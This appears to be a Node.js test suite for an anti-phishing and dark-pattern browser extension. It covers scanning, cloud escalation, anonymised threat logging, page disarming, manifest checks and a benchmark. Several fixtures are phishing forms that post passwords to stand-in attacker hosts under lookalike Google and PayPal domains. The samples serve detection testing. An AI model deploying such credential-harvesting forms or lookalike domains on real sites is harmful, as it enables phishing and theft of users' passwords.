import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { scanDomStructure, disarmDomThreats } from "../shared/domScanner.js";
import {
  executeHybridDomScan,
  DEFAULT_REMOTE_CONFIG_POLICY,
} from "../shared/hybridRouter.js";
import { firebaseHybridStore } from "../server/firebase/threatStore.js";
import {
  GROUND_TRUTH_BENCHMARK_CORPUS,
  runGroundTruthBenchmark,
} from "../server/benchmark/groundTruthCorpus.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT_DIR = path.resolve(__dirname, "..");

test("AC-1: DOM Structural & Semantic Scanner extracts dark patterns and phishing vectors accurately", () => {
  const html = `
    <div>
      <div class="urgency-timer">Offer expires in 02:45</div>
      <input type="checkbox" checked /> Add VIP Protection ($19.99/mo)
      <small style="opacity: 0.25; font-size: 7px;">Automatically billed at $49.99/month after trial.</small>
      <button>No thanks, I prefer paying full price</button>
    </div>
  `;
  const result = scanDomStructure(html, "https://store-trap.example/checkout");
  const categories = result.findings.map((f) => f.category);

  assert.ok(categories.includes("SNEAK_INTO_BASKET"));
  assert.ok(categories.includes("FAKE_URGENCY_TIMER"));
  assert.ok(categories.includes("HIDDEN_SUBSCRIPTION_TRAP"));
  assert.ok(categories.includes("CONFIRMSHAMING_OPT_OUT"));
  assert.equal(result.requiresCloudEscalation, false);
  assert.ok(result.onDeviceConfidence >= 0.9);
});

test("AC-2: Hybrid AI Router resolves single-page dark patterns on-device with 0 cloud bytes and escalates phishing to Cloud Gemini", () => {
  const localScan = executeHybridDomScan(
    {
      html: `<form><input type="checkbox" checked /> Add Extended Warranty ($14.99/mo)</form>`,
      pageUrl: "https://shop.example/cart",
      modePreference: "PREFER_ON_DEVICE",
    },
    DEFAULT_REMOTE_CONFIG_POLICY
  );

  assert.equal(localScan.telemetry.executedRoute, "ON_DEVICE_NANO");
  assert.equal(localScan.telemetry.cloudBytesSent, 0);
  assert.equal(localScan.verdict, "DARK_PATTERN_WARNING");

  const cloudScan = executeHybridDomScan(
    {
      html: `<form action="https://collector-drop.evil-harvest.org/exfil"><input type="password" name="pw" /></form>`,
      pageUrl: "https://g00gle-verify.auth-security-check.net/login",
      modePreference: "PREFER_ON_DEVICE",
    },
    DEFAULT_REMOTE_CONFIG_POLICY,
    (domain, html) => firebaseHybridStore.matchThreatCampaign(domain, html)
  );

  assert.equal(cloudScan.telemetry.executedRoute, "CLOUD_GEMINI_FALLBACK");
  assert.ok(cloudScan.telemetry.cloudBytesSent > 0);
  assert.equal(cloudScan.verdict, "CRITICAL_PHISHING_BLOCK");
  assert.equal(cloudScan.telemetry.matchedCampaignId, "FS-CAMPAIGN-2026-091");
});

test("AC-3: Firebase App Check, Remote Config policy updates, and SHA-256 anonymized Firestore threat logging", () => {
  const status = firebaseHybridStore.getStatusSummary();
  assert.equal(status.firebaseSdkReady, true);
  assert.equal(status.inferenceModeConstant, "prefer_on_device");

  const updated = firebaseHybridStore.updatePolicy({
    escalationThreshold: 0.8,
    strictAppCheck: true,
  });
  assert.equal(updated.escalationThreshold, 0.8);
  assert.equal(
    firebaseHybridStore.verifyAppCheckToken("invalid-forged-token").verified,
    false
  );
  assert.equal(
    firebaseHybridStore.verifyAppCheckToken("valid-debug-token-12345").verified,
    true
  );

  // Reset strictAppCheck for standard demo flows
  firebaseHybridStore.updatePolicy({
    escalationThreshold: 0.72,
    strictAppCheck: false,
  });

  const logged = firebaseHybridStore.recordAnonymizedThreatTelemetry({
    domain: "paypa1-secure.auth-security-check.net",
    executedRoute: "CLOUD_GEMINI_FALLBACK",
    verdict: "CRITICAL_PHISHING_BLOCK",
    findingCategories: ["CROSS_ORIGIN_TOKEN_EXFIL"],
    appCheckVerified: true,
  });
  assert.equal(logged.domainHashSha256.length, 64);
  assert.ok(!logged.domainHashSha256.includes("paypa1"));
});

test("AC-4: One-Click DOM Countermeasure neutralizes dark patterns and blocks phishing form actions", () => {
  const rawHtml = `
    <div>
      <span class="urgency-timer">Offer expires in 02:59</span>
      <input type="checkbox" checked /> Add VIP Club ($19.99/mo)
      <small style="opacity: 0.25;">Automatically billed $39.99/month after trial</small>
      <button>No thanks, I prefer paying full price</button>
      <form action="https://evil-collector.org/steal"><input type="password" /></form>
    </div>
  `;
  const analysis = scanDomStructure(rawHtml, "https://trap.example/pay");
  const disarmed = disarmDomThreats(rawHtml, analysis.findings);

  assert.ok(disarmed.disarmedActionsCount >= 4);
  assert.ok(disarmed.disarmedHtml.includes('data-disarmed-unchecked="true"'));
  assert.ok(disarmed.disarmedHtml.includes("PAUSED [FAKE TIMER DISARMED]"));
  assert.ok(
    disarmed.disarmedHtml.includes("No thanks, continue with standard checkout")
  );
  assert.ok(disarmed.disarmedHtml.includes('action="#blocked-by-domshield"'));
});

test("AC-5: Chrome Extension Manifest V3 compliance, real PNG icons, and service worker rules", () => {
  const manifestPath = path.join(ROOT_DIR, "extension", "manifest.json");
  const manifest = JSON.parse(fs.readFileSync(manifestPath, "utf8"));

  assert.equal(manifest.manifest_version, 3);
  assert.ok(manifest.permissions.includes("sidePanel"));
  assert.ok(manifest.permissions.includes("tabs"));
  assert.ok(manifest.permissions.includes("storage"));
  assert.equal(manifest.action?.default_popup, undefined);

  for (const size of ["16", "48", "128"]) {
    const iconRel = manifest.icons[size];
    const iconAbs = path.join(ROOT_DIR, "extension", iconRel);
    assert.ok(fs.existsSync(iconAbs), `Missing icon ${iconRel}`);
    const buf = fs.readFileSync(iconAbs);
    assert.equal(buf[0], 0x89);
    assert.equal(buf[1], 0x50); // 'P'
    assert.equal(buf[2], 0x4e); // 'N'
    assert.equal(buf[3], 0x47); // 'G'
    const width = buf.readUInt32BE(16);
    const height = buf.readUInt32BE(20);
    assert.equal(width, Number(size));
    assert.equal(height, Number(size));
  }

  const swCode = fs.readFileSync(
    path.join(ROOT_DIR, "extension", "service-worker.js"),
    "utf8"
  );
  assert.ok(swCode.includes("openPanelOnActionClick: true"));
  assert.ok(!swCode.includes("openPanelOnActionIconClick"));
});

test("AC-6: Domain Ground-Truth Benchmark evaluates 24 scenarios with F1 >= 0.95 and 100% On-Device Privacy Ratio", () => {
  assert.equal(GROUND_TRUTH_BENCHMARK_CORPUS.length, 24);
  const report = runGroundTruthBenchmark();

  assert.equal(report.totalScenarios, 24);
  assert.ok(
    report.f1Score >= 0.95,
    `Expected F1 >= 0.95, got ${report.f1Score}`
  );
  assert.equal(report.onDevicePrivacyRatio, 1);
  assert.ok(report.p95LatencyMs < 25);
});
